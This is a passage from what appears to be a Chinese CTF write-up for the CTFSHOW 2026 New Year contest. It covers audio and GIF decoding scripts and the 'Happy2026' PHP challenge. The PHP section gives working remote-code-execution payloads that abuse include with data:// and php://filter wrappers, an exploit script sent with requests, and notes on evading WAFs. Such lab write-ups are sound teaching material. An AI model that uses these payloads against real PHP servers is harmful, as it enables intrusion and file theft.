class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> best[<span class="number">0</span>] <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> best[<span class="number">1</span>] &lt; <span class="built_in">len</span>(PREAMBLE_BITS) - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;preamble not found (best_score=<span class="subst">&#123;best[<span class="number">1</span>]&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> best[<span class="number">0</span>], best[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bits_to_bytes</span>(<span class="params">bits</span>):</span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>):</span><br><span class="line">        b = <span class="number">0</span></span><br><span class="line">        chunk = bits[i:i+<span class="number">8</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> chunk:</span><br><span class="line">            b = (b &lt;&lt; <span class="number">1</span>) | (v &amp; <span class="number">1</span>)</span><br><span class="line">        out.append(b)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ap = argparse.ArgumentParser()</span><br><span class="line">    ap.add_argument(<span class="string">&quot;wav&quot;</span>, nargs=<span class="string">&quot;?&quot;</span>, default=<span class="string">&quot;drum_bits.wav&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input wav (default: drum_bits.wav)&quot;</span>)</span><br><span class="line">    args = ap.parse_args()</span><br><span class="line">    x = read_wav_mono_16bit(args.wav)</span><br><span class="line">    bit_samps = <span class="built_in">int</span>(<span class="built_in">round</span>(BIT_DURATION * SAMPLE_RATE))</span><br><span class="line">    gap_byte_samps = <span class="built_in">int</span>(<span class="built_in">round</span>(GAP_BETWEEN_BYTES * SAMPLE_RATE))</span><br><span class="line">    pre_sil_samps = <span class="built_in">int</span>(<span class="built_in">round</span>(PREAMBLE_SILENCE * SAMPLE_RATE))</span><br><span class="line">    off, score = find_preamble_offset(x)</span><br><span class="line">    payload_start = off + <span class="built_in">len</span>(PREAMBLE_BITS) * bit_samps + pre_sil_samps</span><br><span class="line">    bits = []</span><br><span class="line">    pos = payload_start</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chunk = decode_at(x, pos, <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> chunk <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        bits.extend(chunk)</span><br><span class="line">        pos += <span class="number">8</span> * bit_samps + gap_byte_samps</span><br><span class="line">    data = bits_to_bytes(bits)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = data.decode(<span class="string">&quot;ascii&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        text = data.decode(<span class="string">&quot;ascii&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">    text = text.split(<span class="string">&quot;\x00&quot;</span>)[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] preamble_offset=<span class="subst">&#123;off&#125;</span> samples, score=<span class="subst">&#123;score&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(PREAMBLE_BITS)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] decoded_bytes=<span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>Happy2026</h1>
<p>分类：CTF部分 | 分值：100</p>
<p>题目描述<br>
奇怪的2026</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$happy</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;happy&#x27;</span>];</span><br><span class="line"><span class="variable">$new</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>];</span><br><span class="line"><span class="variable">$year</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;year&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$year</span>==<span class="number">2026</span> &amp;&amp; <span class="variable">$year</span>!==<span class="number">2026</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$year</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$happy</span>[<span class="variable">$new</span>[<span class="variable">$year</span>]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>绕过 <code>if</code> 条件判断，利用 <code>include</code> 函数执行任意代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$year</span> == <span class="number">2026</span> &amp;&amp; <span class="variable">$year</span> !== <span class="number">2026</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$year</span>)</span><br></pre></td></tr></table></figure>
<p>这里利用了 PHP 的类型比较特性：</p>
<ul>
<li><code>$year == 2026</code>：这是一个<strong>弱类型比较</strong>。如果 <code>$year</code> 是字符串 <code>'2026'</code>，PHP 会将其转换为数字进行比较，结果为 <code>true</code>。</li>
<li><code>$year !== 2026</code>：这是一个<strong>强类型比较</strong>（全等比较）。它要求值和类型都相等。如果 <code>$year</code> 是字符串 <code>'2026'</code>，而右边是整数 <code>2026</code>，类型不同，结果为 <code>true</code>（即不全等）。</li>
<li><code>is_numeric($year)</code>：检测变量是否为数字或数字字符串。字符串 <code>'2026'</code> 满足此条件。</li>
</ul>
<p><strong>结论</strong>：我们需要传入 <code>year=2026</code>（字符串形式），即可同时满足这三个条件。</p>
<p>满足条件后，代码执行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="variable">$happy</span>[<span class="variable">$new</span>[<span class="variable">$year</span>]];</span><br></pre></td></tr></table></figure>
<p>这里涉及到数组的嵌套引用。我们已知 <code>$year</code> 的值为 <code>'2026'</code>，所以代码实际上执行的是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="variable">$happy</span>[<span class="variable">$new</span>[<span class="string">&#x27;2026&#x27;</span>]];</span><br></pre></td></tr></table></figure>
<p>我们需要通过 GET 参数构造 <code>$new</code> 和 <code>$happy</code> 数组：</p>
<ul>
<li>我们需要构造 <code>$new</code> 数组，使得 <code>$new['2026']</code> 有一个具体的值，假设为 <code>'0'</code>。即 <code>?new[2026]=0</code>。</li>
<li>此时代码变为 <code>include $happy['0'];</code>。</li>
<li>我们需要构造 <code>$happy</code> 数组，使得 <code>$happy['0']</code> 包含我们要执行的恶意 Payload。即 <code>?happy[0]=Payload</code>。</li>
</ul>
<p><strong><code>include</code> 函数通常用于包含文件，但配合 PHP 伪协议（Wrapper），我们可以执行任意代码。</strong></p>
<p>常用的 Payload 形式是利用 <code>data://</code> 协议：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&#x27;命令&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
<p>将这个 Payload 赋值给 <code>$happy['0']</code>，最终构成的执行语句就是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;data://text/plain,&lt;?php system(&#x27;命令&#x27;); ?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这会直接执行 PHP 代码。</p>
<blockquote>
<ul>
<li>ai</li>
<li>在 PHP 伪协议 <code>data://</code> 的用法中，<code>text</code> 和 <code>plain</code> 分别代表了数据的 <strong>MIME 类型（MIME Type）</strong>。</li>
<li>text：表明该资源是<strong>文本性质</strong>的，而不是图像、视频或二进制程序。</li>
<li>子类表示数据的<strong>具体格式</strong>，<code>plain</code> 表明它是<strong>纯文本</strong>。
<ul>
<li>如果是 <code>text/html</code>，浏览器会将其解析为网页。</li>
<li>如果是 <code>text/plain</code>，则视为没有任何格式标签的普通文字。</li>
</ul>
</li>
<li>这个构造中，虽然我们写入的是 PHP 代码，但为了让 PHP 解释器能够通过伪协议顺利读取这些“字符”，我们通常声明它为纯文本。</li>
<li>当 PHP 的文件包含函数（如 <code>include()</code> 或 <code>require()</code>）处理这个协议时，它会：发现是 <code>data://</code>，无视 MIME 类型的限制，直接提取逗号 <code>,</code> 之后的内容当作 PHP 脚本进行解析并执行</li>
<li>常见的变体：为了绕过 WAF（防火墙）对关键词的拦截</li>
</ul>
</blockquote>
<table>
<thead>
<tr>
<th>形式</th>
<th>结构</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>明文形式</strong></td>
<td><code>data://text/plain,&lt;?php phpinfo();?&gt;</code></td>
</tr>
<tr>
<td><strong>Base64形式</strong></td>
<td><code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</code></td>
</tr>
</tbody>
</table>
<blockquote>
<p><strong>注意</strong>：使用此类 Payload 的前提是服务器配置中 <code>allow_url_fopen</code> 和 <code>allow_url_include</code> 均已开启（均为 On）。</p>
</blockquote>
<p>综上所述，我们需要通过 GET 请求传递以下参数：</p>
<ol>
<li><code>year=2026</code></li>
<li><code>new[2026]=0</code></li>
<li><code>happy[0]=data://text/plain,&lt;?php system('cat flag.php'); ?&gt;</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?year=2026&amp;new[2026]=0&amp;happy[0]=data://text/plain,&lt;?php system(&#x27;ls -al&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-3.png" alt="alt text"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-5.png" alt="alt text"></p>
<ul>
<li>ai<br>
你在 Hackbar 中执行 cat flag.php 看不到回显，是因为 flag.php 里的内容是 PHP 代码（如 &lt;?php $flag=… ）。浏览器会把它当成无效的 HTML 标签隐藏起来，或者 PHP 会尝试执行它而不是显示它。<br>
在 Payload 中使用 Base64 编码来读取文件内容，这样浏览器就能显示编码后的字符串了。</li>
</ul>
<p>修改后的 Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?year=2026&amp;new[2026]=0&amp;happy[0]=data://text/plain,&lt;?php system(&#x27;cat flag.php | base64&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-4.png" alt="alt text"><br>
ctfshow{b775436b-81ba-4295-a317-3bbdf7544dfb}</p>
<ul>
<li>官方：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b1e05aa7-0493-4c4f-bbde-0fcd20409e47.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;?happy[2026.0000000000001]=data:,&lt;?php echo `tac f*`;?&gt;&amp;new[2026.0000000000001]=2026.0000000000001&amp;year=2026.0000000000001&amp;new[2026]=2026&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url=url+payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    flag = response.text[response.text.find(<span class="string">&quot;ctfshow&quot;</span>):]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<ul>
<li>复现遇到证书问题：
<ul>
<li><code>response = requests.get(url=url+payload, verify=False)</code></li>
<li>加上 <code>verify=False</code> 就好了</li>
</ul>
</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image.png" alt="alt text"></p>
<ul>
<li>嘶好奇怪官方的加了base64编码不仅回显了还是正常显示而不是base64显示</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-1.png" alt="alt text"></p>
<ul>
<li>其实是我自己瞎改改坏了要写在``里面啊不然就是和base64按位与输出了</li>
</ul>
<h2 id="更适配的方法"><a class="header-anchor" href="#更适配的方法">¶</a>更适配的方法</h2>
<ul>
<li>大佬：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?year=2026&amp;new[2026]=a&amp;happy[a]=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"># 再url编码（这个是反推出来的</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>特性</th>
<th>写法 A: <code>php://filter</code></th>
<th>写法 B: <code>data://</code></th>
</tr>
</thead>
<tbody>
<tr>
<td>核心原理</td>
<td>将已有的文件内容“流经”过滤器处理</td>
<td>将用户输入的字符串当作 PHP 代码执行</td>
</tr>
<tr>
<td>利用场景</td>
<td>读取服务器上 <strong>存在</strong> 的文件源码</td>
<td>直接执行 <strong>任意系统命令</strong></td>
</tr>
<tr>
<td>Payload 示例</td>
<td><code>.../resource=flag.php</code></td>
<td><code>...,&lt;?php system('ls'); ?&gt;</code></td>
</tr>
<tr>
<td>依赖配置</td>
<td>无特殊要求 (默认开启)</td>
<td>需 <code>allow_url_include = On</code></td>
</tr>
</tbody>
</table>
<ul>
<li>所以这个方法更适配该题目</li>
</ul>
<h1>happyEmoji</h1>
<p>分类：CTF部分 | 分值：300</p>
<p>题目描述<br>
这天小狐狸和一个很好看的姑娘成了好朋友，他很开心。于是他用她发给他的表情写了一段话，分享给更多的朋友，现在大家都开心了。 1. 每一串是一个字母 2. 有眼睛就能做</p>
<ul>
<li>官方脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL.Image <span class="keyword">as</span> Image , numpy <span class="keyword">as</span> np ,libnum,base64</span><br><span class="line">gif = Image.<span class="built_in">open</span>(<span class="string">&#x27;./flag.gif&#x27;</span>)</span><br><span class="line">dh,dw ,dfh,binstr = gif.height//<span class="number">6</span>,gif.width//<span class="number">30</span> ,<span class="number">42</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment">#一共四页</span></span><br><span class="line">    gif.seek(p*<span class="number">31</span>+<span class="number">1</span>) <span class="comment">#31张一轮</span></span><br><span class="line">    gif_np=np.array(gif)[:,:,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):<span class="comment">#6行</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>): <span class="comment">#30列</span></span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):   <span class="comment"># 每串4个球</span></span><br><span class="line">                face =(<span class="number">255</span>-gif_np[r*dh+f*dfh :r*dh+f*dfh+dfh,c*dw:c*dw+dw]).<span class="built_in">sum</span>()/<span class="number">1000</span></span><br><span class="line">                <span class="keyword">if</span> face &gt;=<span class="number">33</span>: binstr+=<span class="string">&#x27;00&#x27;</span></span><br><span class="line">                <span class="keyword">elif</span> face &gt;=<span class="number">30</span> : binstr+=<span class="string">&#x27;01&#x27;</span> </span><br><span class="line">                <span class="keyword">elif</span> face &gt;=<span class="number">26</span> :binstr+=<span class="string">&#x27;10&#x27;</span> </span><br><span class="line">                <span class="keyword">else</span>: binstr+=<span class="string">&#x27;11&#x27;</span> </span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(libnum.b2s(binstr).decode()).decode())</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-2.png" alt="alt text"></p>
<h1>SafePIN</h1>
<p>分类：CTF部分 | 分值：200</p>
<p>题目描述<br>
绝对安全的身份认证系统</p>
<ul>
<li>官方脚本改了下（解决证书问题</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># CTF.SHOW / ctf.show</span></span><br><span class="line"><span class="comment"># Author: h1xa</span></span><br><span class="line"><span class="comment"># https://ctf.show</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys, math, hashlib, struct, wave, time</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">List</span>, <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">SR = <span class="number">44100</span></span><br><span class="line">SOUND_CANCEL = <span class="number">10</span></span><br><span class="line">SOUND_ENTER  = <span class="number">11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prng_u32</span>(<span class="params">seed: <span class="built_in">str</span>, tag: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    h = hashlib.sha256((seed + <span class="string">&quot;|&quot;</span> + tag).encode(<span class="string">&quot;utf-8&quot;</span>)).digest()</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, h[:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">permute_0_9</span>(<span class="params">seed: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    a = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line">    x = prng_u32(seed, <span class="string">&quot;perm&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        x = (x * <span class="number">1664525</span> + <span class="number">1013904223</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        j = x % (i + <span class="number">1</span>)</span><br><span class="line">        a[i], a[j] = a[j], a[i]</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clamp</span>(<span class="params">x: <span class="built_in">float</span>, lo: <span class="built_in">float</span>, hi: <span class="built_in">float</span></span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">    <span class="keyword">return</span> lo <span class="keyword">if</span> x &lt; lo <span class="keyword">else</span> hi <span class="keyword">if</span> x &gt; hi <span class="keyword">else</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key_sound</span>(<span class="params">seed: <span class="built_in">str</span>, sid: <span class="built_in">int</span></span>) -&gt; np.ndarray:</span><br><span class="line">    x = prng_u32(seed, <span class="string">f&quot;p<span class="subst">&#123;sid&#125;</span>&quot;</span>)</span><br><span class="line">    base = <span class="number">1050.0</span> + sid * <span class="number">23.0</span> + (((x &amp; <span class="number">0xff</span>) - <span class="number">128</span>) * <span class="number">0.35</span>)</span><br><span class="line">    dur  = <span class="number">0.082</span> + (((x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) / <span class="number">255.0</span>) * <span class="number">0.018</span></span><br><span class="line">    pre  = <span class="number">0.0018</span> + (((x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) / <span class="number">255.0</span>) * <span class="number">0.0045</span></span><br><span class="line">    atk  = <span class="number">0.0012</span> + (((x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>) / <span class="number">255.0</span>) * <span class="number">0.0022</span></span><br><span class="line">    click= <span class="number">0.16</span> + ((x &amp; <span class="number">0xff</span>) / <span class="number">255.0</span>) * <span class="number">0.10</span></span><br><span class="line">    pan  = clamp(((sid - <span class="number">4.5</span>) / <span class="number">14.0</span>) + ((((x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) - <span class="number">128</span>) / <span class="number">128.0</span>) * <span class="number">0.03</span>, -<span class="number">0.35</span>, <span class="number">0.35</span>)</span><br><span class="line"></span><br><span class="line">    left_gain  = clamp(<span class="number">1.0</span> - pan, <span class="number">0.70</span>, <span class="number">1.30</span>)</span><br><span class="line">    right_gain = clamp(<span class="number">1.0</span> + pan, <span class="number">0.70</span>, <span class="number">1.30</span>)</span><br><span class="line"></span><br><span class="line">    total = <span class="built_in">int</span>(<span class="built_in">round</span>((pre + dur) * SR))</span><br><span class="line">    t = np.arange(total, dtype=np.float32) / SR</span><br><span class="line"></span><br><span class="line">    sig = np.zeros(total, dtype=np.float32)</span><br><span class="line">    mask = t &gt;= pre</span><br><span class="line">    tt = t[mask] - pre</span><br><span class="line"></span><br><span class="line">    k_decay = <span class="number">18.0</span> + sid * <span class="number">0.65</span></span><br><span class="line">    f1 = base</span><br><span class="line">    f2 = base * (<span class="number">1.0</span> + (sid - <span class="number">5</span>) * <span class="number">0.00032</span>)</span><br><span class="line">    tone = np.sin(<span class="number">2.0</span> * math.pi * f1 * tt) * <span class="number">0.70</span> + np.sin(<span class="number">2.0</span> * math.pi * f2 * tt) * <span class="number">0.30</span></span><br><span class="line"></span><br><span class="line">    atk_safe = <span class="built_in">max</span>(atk, <span class="number">1e-6</span>)</span><br><span class="line">    env = np.empty_like(tt)</span><br><span class="line">    m = tt &lt; atk_safe</span><br><span class="line">    env[m] = tt[m] / atk_safe</span><br><span class="line">    env[~m] = np.exp(-k_decay * (tt[~m] - atk_safe))</span><br><span class="line">    env = np.clip(env, <span class="number">0.0</span>, <span class="number">1.0</span>)</span><br><span class="line"></span><br><span class="line">    c = np.zeros_like(tt)</span><br><span class="line">    cm = tt &lt; <span class="number">0.006</span></span><br><span class="line">    <span class="keyword">if</span> np.<span class="built_in">any</span>(cm):</span><br><span class="line">        ttc = tt[cm]</span><br><span class="line">        phase = (sid + <span class="number">1</span>) * <span class="number">0.9</span></span><br><span class="line">        pulse = np.sin(<span class="number">2.0</span> * math.pi * (<span class="number">2500.0</span> + sid * <span class="number">37.0</span>) * ttc + phase)</span><br><span class="line">        noise = (np.sin(<span class="number">2.0</span> * math.pi * (<span class="number">9000.0</span> + sid * <span class="number">11.0</span>) * ttc) +</span><br><span class="line">                 np.sin(<span class="number">2.0</span> * math.pi * (<span class="number">12000.0</span> + sid * <span class="number">13.0</span>) * ttc)) * <span class="number">0.5</span></span><br><span class="line">        c[cm] = (<span class="number">0.62</span> * pulse + <span class="number">0.38</span> * noise) * (<span class="number">1.0</span> - ttc / <span class="number">0.006</span>)</span><br><span class="line"></span><br><span class="line">    sig[mask] = (tone * env + c * click) * <span class="number">0.85</span></span><br><span class="line">    l = np.clip(sig * left_gain, -<span class="number">1.0</span>, <span class="number">1.0</span>)</span><br><span class="line">    r = np.clip(sig * right_gain, -<span class="number">1.0</span>, <span class="number">1.0</span>)</span><br><span class="line">    mono = (l + r) * <span class="number">0.5</span></span><br><span class="line">    <span class="keyword">return</span> np.clip(mono * <span class="number">0.85</span>, -<span class="number">1.0</span>, <span class="number">1.0</span>).astype(np.float32)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_wav_mono</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; np.ndarray:</span><br><span class="line">    <span class="keyword">with</span> wave.<span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> wf:</span><br><span class="line">        ch = wf.getnchannels()</span><br><span class="line">        sw = wf.getsampwidth()</span><br><span class="line">        sr = wf.getframerate()</span><br><span class="line">        n  = wf.getnframes()</span><br><span class="line">        raw = wf.readframes(n)</span><br><span class="line">    <span class="keyword">if</span> sr != SR <span class="keyword">or</span> sw != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;unexpected wav format&quot;</span>)</span><br><span class="line">    x = np.frombuffer(raw, dtype=np.int16).astype(np.float32) / <span class="number">32768.0</span></span><br><span class="line">    <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">        x = x.reshape(-<span class="number">1</span>, <span class="number">2</span>).mean(axis=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rms_env</span>(<span class="params">x: np.ndarray, win: <span class="built_in">int</span></span>) -&gt; np.ndarray:</span><br><span class="line">    pad = win // <span class="number">2</span></span><br><span class="line">    xp = np.pad(x, (pad, pad), mode=<span class="string">&quot;constant&quot;</span>)</span><br><span class="line">    w = np.lib.stride_tricks.as_strided(</span><br><span class="line">        xp, shape=(x.size, win), strides=(xp.strides[<span class="number">0</span>], xp.strides[<span class="number">0</span>])</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> np.sqrt(np.mean(w * w, axis=<span class="number">1</span>) + <span class="number">1e-12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">segment</span>(<span class="params">env: np.ndarray</span>) -&gt; <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]]:</span><br><span class="line">    bg = np.quantile(env, <span class="number">0.60</span>)</span><br><span class="line">    hi = np.quantile(env, <span class="number">0.98</span>)</span><br><span class="line">    thr = <span class="built_in">max</span>(bg * <span class="number">2.8</span>, (bg + hi) * <span class="number">0.25</span>)</span><br><span class="line">    idx = np.flatnonzero(env &gt; thr)</span><br><span class="line">    <span class="keyword">if</span> idx.size == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    gap = <span class="built_in">int</span>(<span class="number">0.030</span> * SR)</span><br><span class="line">    starts = [<span class="built_in">int</span>(idx[<span class="number">0</span>])]</span><br><span class="line">    ends = []</span><br><span class="line">    prev = <span class="built_in">int</span>(idx[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> idx[<span class="number">1</span>:]:</span><br><span class="line">        v = <span class="built_in">int</span>(v)</span><br><span class="line">        <span class="keyword">if</span> v - prev &gt; gap:</span><br><span class="line">            ends.append(prev)</span><br><span class="line">            starts.append(v)</span><br><span class="line">        prev = v</span><br><span class="line">    ends.append(prev)</span><br><span class="line"></span><br><span class="line">    pad = <span class="built_in">int</span>(<span class="number">0.010</span> * SR)</span><br><span class="line">    min_len = <span class="built_in">int</span>(<span class="number">0.030</span> * SR)</span><br><span class="line">    segs = []</span><br><span class="line">    <span class="keyword">for</span> s, e <span class="keyword">in</span> <span class="built_in">zip</span>(starts, ends):</span><br><span class="line">        s2 = <span class="built_in">max</span>(<span class="number">0</span>, s - pad)</span><br><span class="line">        e2 = <span class="built_in">min</span>(env.size - <span class="number">1</span>, e + pad)</span><br><span class="line">        <span class="keyword">if</span> (e2 - s2 + <span class="number">1</span>) &gt;= min_len:</span><br><span class="line">            segs.append((s2, e2 + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> segs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">best_sid</span>(<span class="params">seed: <span class="built_in">str</span>, clip: np.ndarray, templates: <span class="type">Dict</span>[<span class="built_in">int</span>, np.ndarray]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    clip = clip - clip.mean()</span><br><span class="line">    clip = clip / (np.<span 